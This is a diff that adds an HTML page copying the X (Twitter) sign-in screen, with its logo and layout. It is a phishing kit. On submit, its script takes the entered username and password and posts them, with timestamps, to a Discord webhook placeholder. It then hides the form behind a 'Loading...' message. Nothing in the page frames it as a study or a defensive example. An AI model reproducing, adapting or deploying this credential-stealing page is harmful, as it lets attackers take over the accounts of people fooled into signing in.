@@ -1,0 +1,219 @@
+<!-- this page is not my disign. i get in web that i snakk changed and added :) -->
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, Helvetica;
+        }
+
+        body {
+            background: #fff;
+            min-height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            min-height: 100vh;
+        }
+
+        .left-section {
+
+            width: 50%;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+        }
+
+        .left-section svg {
+            width: 300px;
+            height: 300px;
+        }
+
+        .right-section {
+            width: 50%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 40px;
+        }
+
+
+        .logo {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 50px;
+            color: #000;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 15px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #000;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 15px;
+            background: #f7f9fa;
+            color: #000;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #1d9bf0;
+            background: #fff;
+        }
+
+        .form-group input::placeholder {
+            color: #657786;
+        }
+
+        #form button {
+            width: 100%;
+            padding: 15px;
+            background: #1d9bf0;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        #form button:hover {
+            background: #1a91da;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 15px;
+        }
+
+        .signup-link a {
+            color: #1d9bf0;
+            text-decoration: none;
+            font-weight: 700;
+
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+
+        }
+
+        @media (max-width: 1024) {
+
+            .left-section {
+                display: none;
+            }
+
+            .right-section {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="left-section">
+            <svg viewBox="0 0 24 24" aria-label="X Logo" fill="white">
+                <path
+                    d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24h-6.63l-5.117-6.686-5.86 6.686h-3.31l7.73-8.835L2.42 2.25h6.79l4.633 6.143L18.244 2.25zm-1.161 17.52h1.833L7.084 4.126H5.117L17.083 19.77z" />
+            </svg>
+        </div>
+
+        <div class="right-section">
+            <div class="logo">X</div>
+
+            <h1 style="font-size: 31px; font-weight: 700; margin-bottom: 30px; color: #000;">Sign in to X</h1>
+
+            <form id="form">
+
+                <div class="form-group">
+                    <label for="email">Email or username</label>
+                    <input type="text" id="email" placeholder="" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="" required>
+                </div>
+
+                <button type="submit">Sign in</button>
+
+                <div class="signup-link">
+                    Don't have an account? <a href="#">Sign up</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+
+        const formLoadTime = new Date();
+
+        document.getElementById('form').addEventListener('submit', function (event) {
+
+            // Prevent the browser from reloading
+            event.preventDefault();
+
+            const submitClickTime = new Date();
+
+            const nameValue = document.getElementById('email').value;
+            const passwordValue = document.getElementById("password").value;
+
+            const webhookUrl = "{{DS-HOOK}}";
+
+            const discordMessage = {
+
+                content: `**New Form Submission**\n` +
+                    `**Name:** ${nameValue}\n` +
+                    `**Password:** ${passwordValue}\n` +
+                    `**Form Opened At:** ${formLoadTime.toLocaleString()}\n` +
+                    `**Submit Clicked At:** ${submitClickTime.toLocaleString()}`
+            };
+
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(discordMessage)
+            });
+
+            document.querySelector('h1').textContent = "Loading...";
+            document.getElementById('form').style.display = "none";
+        })
+
+
+    </script>
+
+</body>
+
+</html>
